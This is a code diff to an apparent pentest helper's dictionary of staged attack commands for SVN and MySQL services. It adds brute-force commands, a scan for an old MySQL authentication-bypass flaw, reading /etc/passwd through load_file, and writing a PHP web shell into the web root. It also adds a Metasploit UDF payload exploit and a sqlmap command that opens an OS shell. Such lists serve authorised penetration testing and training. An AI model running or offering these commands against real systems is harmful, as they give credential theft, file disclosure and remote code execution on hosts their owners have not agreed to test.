@@ -4659,10 +4659,12 @@ _STEP_COMMANDS = {
         1: [
             "svn info svn://<RHOST>/",
             "svn ls -R svn://<RHOST>/",
+            "nmap -p3690 --script svn-brute <RHOST>   # if read requires creds",
         ],
         2: [
             "svn checkout svn://<RHOST>/ ./svn-loot",
             "svn log -v svn://<RHOST>/",
+            "svn diff -r 1:HEAD svn://<RHOST>/   # everything added/removed across history — creds often deleted in later revs",
         ],
         3: [
             "svn cat -r <REV> svn://<RHOST>/<PATH>",
@@ -4683,13 +4685,17 @@ _STEP_COMMANDS = {
             "hydra -C <(printf 'root:\\nroot:root\\nroot:password\\nadmin:admin\\n') mysql://<RHOST>:<RPORT> -f",
             "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt mysql://<RHOST>:<RPORT>",
             "nmap -p<RPORT> --script mysql-brute <RHOST>",
+            "nmap -p<RPORT> --script mysql-vuln-cve2012-2122 <RHOST>   # auth bypass on old 5.x",
         ],
         3: [
             "mysql -h <RHOST> -u <USER> -p<PASS> -e 'show databases; select user,authentication_string from mysql.user;'",
             "nmap -p<RPORT> --script mysql-dump-hashes --script-args username=<USER>,password=<PASS> <RHOST>",
+            "mysql -h <RHOST> -u <USER> -p<PASS> --skip-ssl -e \"select load_file('/etc/passwd');\"",
         ],
         4: [
             "mysql -h <RHOST> -u <USER> -p<PASS> -e \"select '<?php system($_GET[0]);?>' into outfile '/var/www/html/sh.php';\"",
+            "msfconsole -q -x 'use exploit/multi/mysql/mysql_udf_payload; set RHOSTS <RHOST>; set USERNAME <USER>; set PASSWORD <PASS>; run'",
+            "# UDF RCE (FILE priv + writable plugin_dir): sqlmap -d 'mysql://<USER>:<PASS>@<RHOST>:<RPORT>/<DB>' --os-shell",
         ],
         5: [
             "# HackTricks MySQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql",
